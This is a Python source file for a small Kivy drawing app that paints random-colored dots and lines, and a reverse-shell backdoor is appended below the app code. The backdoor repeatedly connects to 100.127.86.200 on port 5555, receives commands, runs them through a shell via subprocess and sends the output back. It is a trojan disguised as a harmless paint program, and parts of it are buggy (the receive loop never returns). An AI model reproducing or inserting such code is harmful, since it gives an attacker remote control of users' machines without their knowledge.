import random
import socket
import json
import time
import subprocess

from kivy.app import App
from kivy.core.window import Window
from kivy.graphics import Color, Ellipse, Line
from kivy.uix.widget import Widget
from kivy.uix.button import Button

# RGBA = Red,Green,Blue, Opacity
Window.clearcolor = (1, 1, 1, 1)


class PaintWindow(Widget):
    def on_touch_down(self, touch):
        colorR = random.randint(0, 255)
        colorG = random.randint(0, 255)
        colorB = random.randint(0, 255)
        self.canvas.add(Color(rgb=(colorR / 255.0, colorG / 255.0, colorB / 255.0)))
        d = 30
        self.canvas.add(Ellipse(pos=(touch.x - d / 2, touch.y - d / 2), size=(d, d)))
        touch.ud['line'] = Line(points=(touch.x, touch.y))
        self.canvas.add(touch.ud['line'])

    def on_touch_move(self, touch):
        touch.ud['line'].points += [touch.x, touch.y]


# Root Window = Paint Window + Button
class PaintApp(App):
    def build(self):
        rootWindow = Widget()
        self.painter = PaintWindow()
        clearnBtn = Button(text='Clear')
        clearnBtn.bind(on_release=self.clear_canvas)
        rootWindow.add_widget(self.painter)
        rootWindow.add_widget(clearnBtn)

        return rootWindow

    def clear_canvas(self, obj):
        self.painter.canvas.clear()


PaintApp().run()

# 1) Import Line Graphics
# 2) Create a Touch dictionary -> Store the initial touch point in it
# 3) When the moose is dragged to extend the line store the next points inside dictionary
# 4) Store it inside the canvas
# 5) Random colours

def reliable_send(data):
			jsondata = json.dumps(data)
			s.send(jsondata.encode())
			
def reliable_recv():
				data = ""
				while True :
						 try :
						 	data = data + s.recv(1024).decode().rstrip()
						 except ValueError() :
						 		continue
						 		
						 		
def connection():
		while True:
						time.sleep(20)
						try :
								s.connect(("100.127.86.200",5555))
								shell()
								s.close()
						except:
								connection()
								
def shell():
		while True :
				command = reliable_recv()
				if command == 'quit' :
							break
				else :
						execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						result = execute.stdout.read() + execute.stderr.read()
						result = result.encode()
						reliable_send(result)



s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()